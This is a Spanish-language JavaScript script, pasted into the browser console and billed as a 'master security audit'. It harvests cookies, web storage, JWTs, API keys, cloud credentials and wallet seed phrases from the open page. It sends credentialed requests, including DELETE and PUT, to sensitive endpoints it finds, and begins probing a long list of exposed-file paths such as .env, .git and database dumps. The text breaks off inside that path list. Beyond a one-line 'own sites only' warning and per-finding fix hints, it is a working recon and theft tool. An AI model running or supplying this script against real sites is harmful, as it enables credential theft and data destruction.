// =============================================================================
// BUNK3R SECURITY AUDIT v4.0 MASIVO - SCRIPT DEFINITIVO PARA CONSOLA F12
// =============================================================================
// 50+ BLOQUES DE PRUEBAS | 500+ PAYLOADS | EXTRACCION COMPLETA DE DATOS
// INCLUYE: SQL, NoSQL, XSS, XXE, SSTI, LDAP, CRLF, SSRF, Command Injection
// ADVERTENCIA: SOLO USAR EN TUS PROPIOS SITIOS WEB
// =============================================================================

(async function BUNK3R_MASTER_AUDIT_V4_MASIVO() {
    'use strict';
    
    const VERSION = '4.0 MASIVO';
    const baseUrl = window.location.origin;
    const results = { critical: [], high: [], medium: [], low: [], info: [] };
    const extractedData = { 
        tokens: [], passwords: [], apiKeys: [], cookies: [], storage: [], 
        globals: [], endpoints: [], secrets: [], exposedFiles: [], 
        injectionVulns: [], authIssues: [], databaseLeaks: [],
        adminPanels: [], sensitiveResponses: []
    };

    console.clear();
    console.log('%c' + '█'.repeat(80), 'color:#ff0000');
    console.log('%c  ██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗██████╗ ██████╗ ', 'font-size:14px;color:#ff0000;font-weight:bold');
    console.log('%c  ██╔══██╗██║   ██║████╗  ██║██║ ██╔╝╚════██╗██╔══██╗', 'font-size:14px;color:#ff0000;font-weight:bold');
    console.log('%c  ██████╔╝██║   ██║██╔██╗ ██║█████╔╝  █████╔╝██████╔╝', 'font-size:14px;color:#ff0000;font-weight:bold');
    console.log('%c  ██╔══██╗██║   ██║██║╚██╗██║██╔═██╗  ╚═══██╗██╔══██╗', 'font-size:14px;color:#ff0000;font-weight:bold');
    console.log('%c  ██████╔╝╚██████╔╝██║ ╚████║██║  ██╗██████╔╝██║  ██║', 'font-size:14px;color:#ff0000;font-weight:bold');
    console.log('%c  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝', 'font-size:14px;color:#ff0000;font-weight:bold');
    console.log('%c' + '█'.repeat(80), 'color:#ff0000');
    console.log('%c  MASTER SECURITY AUDIT v' + VERSION, 'font-size:20px;color:#ffff00;font-weight:bold');
    console.log('%c  50+ BLOQUES | 500+ PAYLOADS | MODO PENETRACION COMPLETA', 'font-size:12px;color:#00ff00');
    console.log('%c' + '█'.repeat(80), 'color:#ff0000');
    console.log('%c  ⚠️ ADVERTENCIA: Solo usar en sitios PROPIOS. Uso ilegal = responsabilidad tuya', 'color:#ff8800;font-weight:bold');
    console.log('%c' + '█'.repeat(80) + '\n', 'color:#ff0000');

    // ==========================================================================
    // PATRONES DE DETECCION DE SECRETOS (EXPANDIDO)
    // ==========================================================================
    const sensitivePatterns = {
        jwt: /eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g,
        apiKey: /['"]?(api[_-]?key|apikey|api_secret|x-api-key)['"]?\s*[:=]\s*['"]?([a-zA-Z0-9_-]{16,})['"]?/gi,
        awsAccessKey: /AKIA[0-9A-Z]{16}/g,
        awsSecretKey: /['"]?aws[_-]?secret[_-]?access[_-]?key['"]?\s*[:=]\s*['"]?([A-Za-z0-9/+=]{40})['"]?/gi,
        googleApiKey: /AIza[0-9A-Za-z_-]{35}/g,
        googleOAuth: /[0-9]+-[a-z0-9_]{32}\.apps\.googleusercontent\.com/g,
        stripeKey: /(sk|pk|rk)_(test|live)_[0-9a-zA-Z]{24,}/g,
        stripeWebhook: /whsec_[a-zA-Z0-9]{32,}/g,
        privateKeyRSA: /-----BEGIN RSA PRIVATE KEY-----[\s\S]+?-----END RSA PRIVATE KEY-----/g,
        privateKeyEC: /-----BEGIN EC PRIVATE KEY-----[\s\S]+?-----END EC PRIVATE KEY-----/g,
        privateKeyGeneric: /-----BEGIN PRIVATE KEY-----[\s\S]+?-----END PRIVATE KEY-----/g,
        password: /['"]?(password|passwd|pwd|pass|contraseña)['"]?\s*[:=]\s*['"]([^'"]{4,})['"]?/gi,
        bearer: /Bearer\s+[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g,
        basicAuth: /Basic\s+[A-Za-z0-9+/=]{20,}/g,
        telegramBot: /[0-9]{8,10}:[A-Za-z0-9_-]{35}/g,
        discordToken: /[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}/g,
        discordWebhook: /https:\/\/discord(app)?\.com\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_-]+/g,
        slackToken: /xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*/g,
        slackWebhook: /https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[a-zA-Z0-9]+/g,
        githubToken: /gh[pousr]_[A-Za-z0-9_]{36}/g,
        githubOAuth: /gho_[A-Za-z0-9_]{36}/g,
        mongoDbUri: /mongodb(\+srv)?:\/\/[^\s"'<>]+/g,
        postgresUri: /postgres(ql)?:\/\/[^\s"'<>]+/g,
        mysqlUri: /mysql:\/\/[^\s"'<>]+/g,
        redisUri: /redis:\/\/[^\s"'<>]+/g,
        firebaseKey: /AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}/g,
        firebaseUrl: /https:\/\/[a-z0-9-]+\.firebaseio\.com/g,
        twilioSid: /AC[a-f0-9]{32}/g,
        twilioAuth: /SK[a-f0-9]{32}/g,
        sendgridKey: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/g,
        mailgunKey: /key-[a-zA-Z0-9]{32}/g,
        openaiKey: /sk-[a-zA-Z0-9]{48}/g,
        herokuApiKey: /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/g,
        paypalClientId: /A[A-Za-z0-9_-]{20,}/g,
        squareToken: /sq0[a-z]{3}-[A-Za-z0-9_-]{22,}/g,
        shopifyToken: /shpat_[a-fA-F0-9]{32}/g,
        shopifySharedSecret: /shpss_[a-fA-F0-9]{32}/g,
        tonMnemonic: /\b([a-z]+\s+){11,23}[a-z]+\b/gi,
        cryptoPrivateKey: /[0-9a-fA-F]{64}/g,
        walletSeed: /['"]?(seed|mnemonic|recovery|phrase)['"]?\s*[:=]\s*['"]([^'"]{20,})['"]?/gi,
        secretGeneric: /['"]?(secret|private_key|access_token|refresh_token|client_secret)['"]?\s*[:=]\s*['"]([^'"]{10,})['"]?/gi,
        azureKey: /['"]?azure[_-]?(storage|account)?[_-]?key['"]?\s*[:=]\s*['"]([A-Za-z0-9+/=]{88})['"]?/gi,
        gcpServiceAccount: /"type"\s*:\s*"service_account"/g
    };

    const sensitiveKeys = [
        'token', 'auth', 'password', 'secret', 'key', 'jwt', 'session', 'user', 
        'credit', 'card', 'api', 'bearer', 'credential', 'private', 'wallet', 
        'seed', 'mnemonic', 'hash', 'salt', 'admin', 'root', 'master', 'config',
        'database', 'db', 'mongo', 'postgres', 'mysql', 'redis', 'access',
        'refresh', 'oauth', 'client_id', 'client_secret', 'telegram', 'bot',
        'webhook', 'ton', 'crypto', 'eth', 'btc', 'balance', 'transfer'
    ];

    // ==========================================================================
    // FUNCIONES UTILITARIAS
    // ==========================================================================
    function addFinding(severity, test, desc, fix, extracted = null) {
        results[severity].push({ test, desc, fix, extracted, timestamp: new Date().toISOString() });
    }

    function extractSecrets(text, source) {
        if (!text || typeof text !== 'string') return;
        for (const [type, pattern] of Object.entries(sensitivePatterns)) {
            const matches = text.match(pattern);
            if (matches) {
                matches.forEach(match => {
                    if (match.length > 10 && match.length < 500) {
                        if (!extractedData.secrets.some(s => s.value === match)) {
                            extractedData.secrets.push({ type, value: match, source, timestamp: new Date().toISOString() });
                        }
                    }
                });
            }
        }
    }

    async function testRequest(url, options = {}) {
        try {
            const resp = await fetch(url, { 
                ...options, 
                mode: 'cors',
                credentials: 'include',
                signal: AbortSignal.timeout(8000)
            });
            const text = await resp.text().catch(() => '');
            return { ok: true, status: resp.status, headers: resp.headers, text, url };
        } catch(e) {
            return { ok: false, error: e.message, url };
        }
    }

    async function testRequestNoCredentials(url, options = {}) {
        try {
            const resp = await fetch(url, { 
                ...options, 
                mode: 'cors',
                credentials: 'omit',
                signal: AbortSignal.timeout(8000)
            });
            return { ok: true, status: resp.status, headers: resp.headers, text: await resp.text().catch(() => '') };
        } catch(e) {
            return { ok: false, error: e.message };
        }
    }

    let currentBlock = 0;
    const totalBlocks = 50;
    function log(msg) {
        currentBlock++;
        const pct = Math.round((currentBlock / totalBlocks) * 100);
        const bar = '█'.repeat(Math.floor(pct / 5)) + '░'.repeat(20 - Math.floor(pct / 5));
        console.log(`%c[${currentBlock}/${totalBlocks}] [${bar}] ${pct}% - ${msg}`, 'font-size:11px;color:#00ff00');
    }

    function logWarning(msg) {
        console.log(`%c⚠️ ${msg}`, 'color:#ff8800;font-size:11px');
    }

    function logCritical(msg) {
        console.log(`%c🔴 CRITICO: ${msg}`, 'color:#ff0000;font-weight:bold;font-size:12px');
    }

    // ==========================================================================
    // BLOQUE 1-3: COOKIES, LOCALSTORAGE, SESSIONSTORAGE
    // ==========================================================================
    log('ANALIZANDO COOKIES EN PROFUNDIDAD...');
    document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.split('=').map(s => s.trim());
        if (name && value) {
            extractedData.cookies.push({ name, value: value.substring(0, 500), httpOnly: 'No (accesible por JS)' });
            extractSecrets(value, `Cookie: ${name}`);
            
            if (/^eyJ/.test(value)) {
                extractedData.tokens.push({ type: 'JWT en Cookie', name, value, decoded: null });
                try {
                    const payload = JSON.parse(atob(value.split('.')[1]));
                    extractedData.tokens[extractedData.tokens.length - 1].decoded = payload;
                    logCritical(`JWT en cookie "${name}" - Payload: ${JSON.stringify(payload).substring(0, 100)}`);
                } catch(e) {}
                addFinding('critical', 'JWT en Cookie', `Cookie "${name}" contiene JWT accesible por JavaScript`, 'Usar flag HttpOnly para proteger tokens', { name, value: value.substring(0, 100) });
            }
            
            sensitiveKeys.forEach(k => {
                if (name.toLowerCase().includes(k)) {
                    addFinding('critical', 'Cookie Sensible Expuesta', `Cookie "${name}" contiene datos sensibles y es accesible por JS`, 'Agregar flag HttpOnly y Secure', { name, value: value.substring(0, 100) });
                }
            });
        }
    });

    log('ANALIZANDO LOCALSTORAGE COMPLETO...');
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key) || '';
        extractedData.storage.push({ type: 'localStorage', key, value: value.substring(0, 500), size: value.length });
        extractSecrets(value, `localStorage: ${key}`);
        
        if (/^eyJ/.test(value)) {
            extractedData.tokens.push({ type: 'JWT en localStorage', key, value });
            logCritical(`JWT encontrado en localStorage["${key}"]`);
            addFinding('critical', 'JWT en localStorage', `"${key}" contiene token JWT expuesto`, 'Almacenar tokens en cookies HttpOnly, no en localStorage');
        }
        
        try {
            const parsed = JSON.parse(value);
            if (typeof parsed === 'object') {
                const jsonStr = JSON.stringify(parsed);
                sensitiveKeys.forEach(k => {
                    if (jsonStr.toLowerCase().includes(k)) {
                        addFinding('high', 'Datos Sensibles en localStorage', `"${key}" contiene JSON con datos sensibles`, 'Mover datos sensibles al backend');
                    }
                });
            }
        } catch(e) {}
    }

    log('ANALIZANDO SESSIONSTORAGE COMPLETO...');
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key) || '';
        extractedData.storage.push({ type: 'sessionStorage', key, value: value.substring(0, 500), size: value.length });
        extractSecrets(value, `sessionStorage: ${key}`);
        
        if (/^eyJ/.test(value)) {
            extractedData.tokens.push({ type: 'JWT en sessionStorage', key, value });
            addFinding('critical', 'JWT en sessionStorage', `"${key}" contiene JWT`, 'Usar cookies HttpOnly');
        }
    }

    // ==========================================================================
    // BLOQUE 4-5: INDEXEDDB Y WEB SQL
    // ==========================================================================
    log('ANALIZANDO INDEXEDDB...');
    if (window.indexedDB) {
        try {
            const dbs = await indexedDB.databases();
            for (const db of dbs) {
                addFinding('info', 'IndexedDB Encontrada', `Base de datos: ${db.name} v${db.version}`, 'Verificar que no almacene datos sensibles');
            }
        } catch(e) {
            addFinding('info', 'IndexedDB', 'No se pudo enumerar bases de datos', 'Verificar manualmente');
        }
    }

    log('VERIFICANDO CACHE API...');
    if ('caches' in window) {
        try {
            const cacheNames = await caches.keys();
            for (const name of cacheNames) {
                const cache = await caches.open(name);
                const keys = await cache.keys();
                addFinding('info', 'Cache API', `Cache "${name}" con ${keys.length} entradas`, 'Verificar que no cachee datos sensibles');
            }
        } catch(e) {}
    }

    // ==========================================================================
    // BLOQUE 6-7: VARIABLES GLOBALES (EXPANDIDO)
    // ==========================================================================
    log('ANALIZANDO VARIABLES GLOBALES PELIGROSAS...');
    const dangerousGlobals = [
        'token', 'apiKey', 'api_key', 'API_KEY', 'secret', 'SECRET', 'password', 'PASSWORD',
        'auth', 'Auth', 'AUTH', 'config', 'Config', 'CONFIG', 'user', 'User', 'USER',
        'credentials', 'Credentials', 'privateKey', 'PRIVATE_KEY', 'jwt', 'JWT',
        'bearer', 'Bearer', 'initData', 'telegramData', 'TelegramData', 'TELEGRAM_DATA',
        'accessToken', 'ACCESS_TOKEN', 'refreshToken', 'REFRESH_TOKEN', 
        'BOT_TOKEN', 'botToken', 'TELEGRAM_TOKEN', 'telegramToken',
        'walletKey', 'WALLET_KEY', 'seedPhrase', 'SEED_PHRASE', 'mnemonic', 'MNEMONIC',
        'tonConnect', 'TON_API_KEY', 'tonApiKey', 'walletAddress', 'WALLET_ADDRESS',
        'dbPassword', 'DB_PASSWORD', 'databaseUrl', 'DATABASE_URL', 'mongoUri', 'MONGO_URI',
        'stripeKey', 'STRIPE_KEY', 'paymentSecret', 'PAYMENT_SECRET',
        'adminPassword', 'ADMIN_PASSWORD', 'masterKey', 'MASTER_KEY',
        'encryptionKey', 'ENCRYPTION_KEY', 'signingKey', 'SIGNING_KEY',
        '__NUXT__', '__NEXT_DATA__', '__REDUX_STATE__', '__INITIAL_STATE__',
        'window.config', 'window.settings', 'window.env', 'window.secrets'
    ];
    
    dangerousGlobals.forEach(varName => {
        try {
            let val;
            if (varName.includes('.')) {
                const parts = varName.split('.');
                val = parts.reduce((obj, key) => obj && obj[key], window);
            } else {
                val = window[varName];
            }
            
            if (val !== undefined && val !== null) {
                const valStr = typeof val === 'object' ? JSON.stringify(val) : String(val);
                if (valStr.length > 5) {
                    extractedData.globals.push({ name: varName, value: valStr.substring(0, 500), type: typeof val });
                    extractSecrets(valStr, `window.${varName}`);
                    logCritical(`Variable global expuesta: ${varName}`);
                    addFinding('critical', 'Variable Global Sensible', `window.${varName} expuesto en frontend`, 'Mover toda informacion sensible al backend', { variable: varName, value: valStr.substring(0, 200) });
                }
            }
        } catch(e) {}
    });

    log('BUSCANDO JWTS EN TODAS LAS VARIABLES GLOBALES...');
    Object.keys(window).forEach(key => {
        try {
            const val = window[key];
            if (typeof val === 'string' && /^eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(val)) {
                extractedData.tokens.push({ type: 'JWT en window', key, value: val });
                addFinding('critical', 'JWT en Variable Global', `window.${key} contiene JWT`, 'No exponer JWTs en variables globales');
            }
            if (typeof val === 'object' && val !== null) {
                const str = JSON.stringify(val);
                const jwtMatch = str.match(/eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/);
                if (jwtMatch) {
                    extractedData.tokens.push({ type: 'JWT en objeto global', key, value: jwtMatch[0] });
                    addFinding('critical', 'JWT en Objeto Global', `window.${key} contiene JWT en su estructura`, 'No exponer JWTs');
                }
            }
        } catch(e) {}
    });

    // ==========================================================================
    // BLOQUE 8-9: HEADERS DE SEGURIDAD (COMPLETO)
    // ==========================================================================
    log('VERIFICANDO HEADERS DE SEGURIDAD...');
    try {
        const resp = await fetch(baseUrl, { method: 'HEAD' });
        const h = resp.headers;
        
        const secHeaders = {
            'content-security-policy': { severity: 'critical', desc: 'Previene XSS y ataques de inyeccion' },
            'x-frame-options': { severity: 'high', desc: 'Previene clickjacking' },
            'x-content-type-options': { severity: 'high', desc: 'Previene MIME type sniffing' },
            'strict-transport-security': { severity: 'high', desc: 'Fuerza HTTPS' },
            'x-xss-protection': { severity: 'medium', desc: 'Filtro XSS del navegador' },
            'referrer-policy': { severity: 'medium', desc: 'Controla informacion del referrer' },
            'permissions-policy': { severity: 'low', desc: 'Controla features del navegador' },
            'cross-origin-opener-policy': { severity: 'medium', desc: 'Aislamiento de ventanas' },
            'cross-origin-resource-policy': { severity: 'medium', desc: 'Control de recursos cross-origin' },
            'cross-origin-embedder-policy': { severity: 'low', desc: 'Control de embeds' }
        };
        
        Object.entries(secHeaders).forEach(([header, info]) => {
            if (!h.get(header)) {
                addFinding(info.severity, 'Header de Seguridad Faltante', `Falta: ${header} - ${info.desc}`, `Agregar header ${header}`);
            }
        });
        
        const csp = h.get('content-security-policy');
        if (csp) {
            if (csp.includes("'unsafe-inline'")) {
                addFinding('high', 'CSP Debil', "CSP permite 'unsafe-inline' - vulnerable a XSS", "Eliminar 'unsafe-inline' de CSP");
            }
            if (csp.includes("'unsafe-eval'")) {
                addFinding('high', 'CSP Debil', "CSP permite 'unsafe-eval' - vulnerable a inyeccion", "Eliminar 'unsafe-eval' de CSP");
            }
            if (csp.includes('*')) {
                addFinding('medium', 'CSP Permisivo', 'CSP usa wildcards', 'Especificar dominios exactos');
            }
        }
        
        ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version'].forEach(hdr => {
            const val = h.get(hdr);
            if (val) {
                addFinding('low', 'Informacion de Servidor Expuesta', `${hdr}: ${val}`, 'Ocultar version del servidor');
            }
        });
        
        const cors = h.get('Access-Control-Allow-Origin');
        if (cors === '*') {
            addFinding('high', 'CORS Abierto', 'Access-Control-Allow-Origin: * permite cualquier origen', 'Restringir a dominios especificos');
        }
        
        const allowCreds = h.get('Access-Control-Allow-Credentials');
        if (allowCreds === 'true' && cors === '*') {
            addFinding('critical', 'CORS + Credentials', 'CORS abierto con credentials permite robo de sesion', 'No combinar * con credentials');
        }
    } catch(e) {}

    // ==========================================================================
    // BLOQUE 10-12: SCRIPTS Y CODIGO FUENTE
    // ==========================================================================
    log('ANALIZANDO SCRIPTS INLINE EN PROFUNDIDAD...');
    document.querySelectorAll('script:not([src])').forEach((script, idx) => {
        const code = script.textContent || '';
        extractSecrets(code, `Script inline #${idx + 1}`);
        
        const dangerousPatterns = [
            { n: 'API Key', r: /api[_-]?key\s*[:=]\s*['"]([^'"]+)['"]/gi },
            { n: 'Password', r: /password\s*[:=]\s*['"]([^'"]+)['"]/gi },
            { n: 'Secret', r: /secret\s*[:=]\s*['"]([^'"]+)['"]/gi },
            { n: 'Token', r: /token\s*[:=]\s*['"]([^'"]{20,})['"]/gi },
            { n: 'Private Key', r: /private[_-]?key\s*[:=]\s*['"]([^'"]+)['"]/gi },
            { n: 'Database URL', r: /(mongodb|postgres|mysql|redis):\/\/[^\s'"]+/gi },
            { n: 'Telegram Bot Token', r: /[0-9]{8,10}:[A-Za-z0-9_-]{35}/g },
            { n: 'AWS Key', r: /AKIA[0-9A-Z]{16}/g },
            { n: 'Stripe Key', r: /(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}/g },
            { n: 'Wallet Mnemonic', r: /(seed|mnemonic)\s*[:=]\s*['"]([a-z\s]{20,})['"]/gi }
        ];
        
        dangerousPatterns.forEach(({n, r}) => {
            const m = code.match(r);
            if (m) {
                m.forEach(match => {
                    extractedData.secrets.push({ type: n, value: match, source: `Script inline #${idx+1}` });
                    logCritical(`${n} encontrado en script #${idx+1}`);
                    addFinding('critical', `${n} en Codigo Fuente`, `Script #${idx+1} contiene ${n} expuesto`, 'NUNCA incluir secretos en el frontend', { found: match.substring(0, 100) });
                });
            }
        });
        
        if (/eval\s*\(/.test(code)) addFinding('high', 'Uso de eval()', 'eval() permite ejecucion de codigo arbitrario', 'Eliminar eval() y usar alternativas seguras');
        if (/innerHTML\s*=/.test(code)) addFinding('medium', 'innerHTML Directo', 'innerHTML sin sanitizar = XSS', 'Usar textContent o sanitizar con DOMPurify');
        if (/document\.write\s*\(/.test(code)) addFinding('high', 'document.write()', 'document.write puede ser explotado', 'Usar metodos DOM seguros');
        if (/\.innerHTML\s*\+?=\s*[^'"]/.test(code)) addFinding('high', 'innerHTML con Variable', 'innerHTML con variable = XSS potencial', 'Sanitizar entrada');
        if (/new\s+Function\s*\(/.test(code)) addFinding('high', 'new Function()', 'Permite ejecucion dinamica de codigo', 'Evitar new Function()');
        if (/setTimeout\s*\(\s*['"]/.test(code) || /setInterval\s*\(\s*['"]/.test(code)) {
            addFinding('medium', 'setTimeout/setInterval con String', 'Ejecutar strings como codigo es peligroso', 'Pasar funciones en lugar de strings');
        }
    });

    log('ANALIZANDO SCRIPTS EXTERNOS...');
    document.querySelectorAll('script[src]').forEach(script => {
        const src = script.src;
        if (src.startsWith('http') && !src.includes(location.hostname)) {
            if (!script.integrity) {
                addFinding('high', 'Script Externo sin SRI', `${src.substring(0, 80)}... no tiene integrity hash`, 'Agregar Subresource Integrity (integrity y crossorigin)');
            }
            if (src.startsWith('http://')) {
                addFinding('high', 'Script Externo via HTTP', `${src.substring(0, 80)}... carga por HTTP inseguro`, 'Usar HTTPS para scripts externos');
            }
        }
    });

    log('BUSCANDO SOURCE MAPS EXPUESTOS...');
    document.querySelectorAll('script[src]').forEach(async script => {
        const src = script.src;
        if (src.endsWith('.js')) {
            const mapUrl = src + '.map';
            const result = await testRequest(mapUrl);
            if (result.ok && result.status === 200 && result.text.includes('mappings')) {
                addFinding('medium', 'Source Map Expuesto', `${mapUrl.substring(0, 80)}...`, 'Eliminar source maps en produccion');
            }
        }
    });

    // ==========================================================================
    // BLOQUE 13-15: ANALISIS DEL DOM
    // ==========================================================================
    log('ANALIZANDO FORMULARIOS...');
    document.querySelectorAll('form').forEach((form, idx) => {
        const action = form.action || '';
        const method = (form.method || 'GET').toUpperCase();
        
        if (action.startsWith('http:')) {
            addFinding('critical', 'Formulario via HTTP', `Form #${idx+1} envia datos por HTTP`, 'Usar HTTPS');
        }
        
        if (method === 'POST' && !form.querySelector('input[name*="csrf"], input[name*="token"], input[name*="_token"]')) {
            addFinding('high', 'Formulario sin CSRF Token', `Form #${idx+1} (${action || 'mismo origen'}) sin proteccion CSRF`, 'Implementar tokens CSRF');
        }
        
        const autocomplete = form.getAttribute('autocomplete');
        if (!autocomplete || autocomplete !== 'off') {
            const hasPassword = form.querySelector('input[type="password"]');
            if (hasPassword) {
                addFinding('medium', 'Autocomplete en Form de Password', `Form #${idx+1} permite autocomplete`, 'Agregar autocomplete="off" para forms sensibles');
            }
        }
    });

    log('ANALIZANDO INPUTS HIDDEN Y SENSIBLES...');
    document.querySelectorAll('input[type="hidden"]').forEach(input => {
        const name = input.name || input.id || '';
        const value = input.value || '';
        extractSecrets(value, `Hidden input: ${name}`);
        
        if (/^eyJ/.test(value)) {
            extractedData.tokens.push({ type: 'JWT en hidden input', name, value });
            addFinding('critical', 'JWT en Input Hidden', `Input "${name}" contiene JWT en HTML`, 'No exponer tokens en el DOM');
        }
        
        sensitiveKeys.forEach(k => {
            if (name.toLowerCase().includes(k) && value.length > 5) {
                addFinding('high', 'Valor Sensible en Hidden', `Input "${name}" contiene datos sensibles`, 'Manejar en backend');
            }
        });
    });

    log('ANALIZANDO DATA ATTRIBUTES...');
    document.querySelectorAll('*').forEach(el => {
        Object.entries(el.dataset || {}).forEach(([k, v]) => {
            if (v && v.length > 20) {
                extractSecrets(v, `data-${k} en ${el.tagName}`);
                sensitiveKeys.forEach(sk => {
                    if (k.toLowerCase().includes(sk) || v.toLowerCase().includes(sk)) {
                        addFinding('medium', 'Data Attribute Sensible', `data-${k} contiene datos sensibles`, 'No exponer datos sensibles en atributos HTML');
                    }
                });
            }
        });
    });

    // ==========================================================================
    // BLOQUE 16: COMENTARIOS HTML
    // ==========================================================================
    log('BUSCANDO COMENTARIOS HTML SENSIBLES...');
    const walker = document.createTreeWalker(document.documentElement, NodeFilter.SHOW_COMMENT, null, false);
    while (walker.nextNode()) {
        const comment = walker.currentNode.textContent;
        extractSecrets(comment, 'Comentario HTML');
        
        if (sensitiveKeys.some(k => comment.toLowerCase().includes(k))) {
            addFinding('high', 'Comentario HTML Sensible', `Comentario contiene info sensible: ${comment.substring(0, 80)}...`, 'Eliminar comentarios en produccion');
        }
        
        if (/TODO|FIXME|HACK|XXX|BUG|DEBUG/i.test(comment)) {
            addFinding('low', 'Comentario de Desarrollo', `Comentario de desarrollo expuesto: ${comment.substring(0, 60)}...`, 'Eliminar antes de produccion');
        }
    }

    // ==========================================================================
    // BLOQUE 17-20: DESCUBRIMIENTO DE ENDPOINTS
    // ==========================================================================
    log('DESCUBRIENDO ENDPOINTS EN CODIGO FUENTE...');
    const discoveredEndpoints = new Set();
    
    document.querySelectorAll('script:not([src])').forEach(script => {
        const code = script.textContent || '';
        const patterns = [
            /['"`](\/api\/[^'"`\s]+)['"`]/g,
            /['"`](\/v[0-9]+\/[^'"`\s]+)['"`]/g,
            /fetch\s*\(\s*['"`]([^'"`]+)['"`]/g,
            /axios\.\w+\s*\(\s*['"`]([^'"`]+)['"`]/g,
            /\$\.(?:get|post|ajax)\s*\(\s*['"`]([^'"`]+)['"`]/g,
            /url\s*[:=]\s*['"`]([^'"`]*\/[^'"`]+)['"`]/g,
            /endpoint\s*[:=]\s*['"`]([^'"`]+)['"`]/g,
            /path\s*[:=]\s*['"`](\/[^'"`]+)['"`]/g,
            /href\s*[:=]\s*['"`](\/[^'"`]+)['"`]/g
        ];
        patterns.forEach(p => {
            let m;
            while ((m = p.exec(code)) !== null) {
                if (m[1] && m[1].startsWith('/') && m[1].length < 100) {
                    discoveredEndpoints.add(m[1]);
                }
            }
        });
    });

    document.querySelectorAll('a[href^="/"]').forEach(a => {
        if (a.href && !a.href.includes('#')) {
            const path = new URL(a.href).pathname;
            if (path.includes('api') || path.includes('admin') || path.includes('user')) {
                discoveredEndpoints.add(path);
            }
        }
    });

    extractedData.endpoints = Array.from(discoveredEndpoints);
    console.log(`%c📡 Endpoints descubiertos: ${extractedData.endpoints.length}`, 'color:#00ff00');

    log('PROBANDO ENDPOINTS SENSIBLES SIN AUTENTICACION...');
    const sensitiveEndpointPatterns = /admin|user|wallet|balance|transaction|setting|config|profile|account|payment|transfer|withdraw|deposit|secret|key|token|auth/i;
    const sensitiveEndpoints = Array.from(discoveredEndpoints).filter(e => sensitiveEndpointPatterns.test(e));
    
    for (const ep of sensitiveEndpoints.slice(0, 15)) {
        const result = await testRequest(baseUrl + ep);
        if (result.ok && result.status === 200 && result.text.length > 10) {
            extractedData.authIssues.push({ endpoint: ep, status: result.status, size: result.text.length });
            logCritical(`Endpoint sensible accesible sin auth: ${ep}`);
            addFinding('critical', 'Endpoint sin Autenticacion', `${ep} accesible sin credenciales (${result.text.length} bytes)`, 'Implementar autenticacion y autorizacion');
            extractSecrets(result.text, `Endpoint: ${ep}`);
        }
    }

    log('PROBANDO METODOS HTTP PELIGROSOS...');
    const methodsToTest = ['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE'];
    for (const ep of sensitiveEndpoints.slice(0, 5)) {
        for (const method of methodsToTest) {
            const result = await testRequest(baseUrl + ep, { method });
            if (result.ok && result.status !== 405 && result.status !== 404 && result.status < 500) {
                addFinding('high', `Metodo ${method} Permitido`, `${ep} acepta ${method}`, `Restringir metodos HTTP permitidos`);
            }
        }
    }

    // ==========================================================================
    // BLOQUE 21-25: ARCHIVOS SENSIBLES EXPUESTOS (LISTA MASIVA)
    // ==========================================================================
    log('BUSCANDO ARCHIVOS SENSIBLES EXPUESTOS (LISTA MASIVA)...');
    const sensitiveFiles = [
        // Archivos de configuracion
        '/.env', '/.env.local', '/.env.development', '/.env.production', '/.env.staging',
        '/.env.backup', '/.env.old', '/.env.bak', '/.env.example', '/.env.sample',
        '/config.py', '/config.json', '/config.yaml', '/config.yml', '/config.xml',
        '/settings.py', '/settings.json', '/settings.yaml', '/settings.local.py',
        '/secrets.json', '/secrets.yaml', '/secrets.yml', '/credentials.json',
        '/application.properties', '/application.yml', '/application-prod.yml',
        
        // Git y control de versiones
        '/.git/config', '/.git/HEAD', '/.git/index', '/.git/logs/HEAD',
        '/.git/objects/', '/.git/refs/heads/master', '/.git/refs/heads/main',
        '/.gitignore', '/.gitattributes', '/.gitmodules',
        '/.svn/entries', '/.svn/wc.db', '/.hg/hgrc',
        
        // Backups de base de datos
        '/backup.sql', '/dump.sql', '/database.sql', '/db.sql', '/data.sql',
        '/backup.sql.gz', '/backup.sql.bz2', '/backup.sql.zip',
        '/mysql.sql', '/postgres.sql', '/mongodb.bson',
        '/db_backup.sql', '/full_backup.sql', '/db_dump.sql',
        
        // Backups de sitio
        '/backup.zip', '/backup.tar.gz', '/backup.tar', '/backup.rar',
        '/site.zip', '/www.zip', '/public.zip', '/html.zip',
        '/website.zip', '/files.zip', '/archive.zip',
        '/backup/', '/backups/', '/_backup/', '/old/',
        
        // Logs
        '/debug.log', '/error.log', '/app.log', '/application.log',
        '/access.log', '/server.log', '/laravel.log', '/django.log',
        '/npm-debug.log', '/yarn-error.log', '/pip.log',
        '/logs/', '/log/', '/_logs/',
        
        // PHP
        '/phpinfo.php', '/info.php', '/test.php', '/i.php', '/php.php',
        '/adminer.php', '/phpmyadmin/', '/pma/',
        '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old',
        '/configuration.php', '/config.inc.php', '/db.php', '/database.php',
        
        // Python
        '/requirements.txt', '/Pipfile', '/Pipfile.lock', '/pyproject.toml',
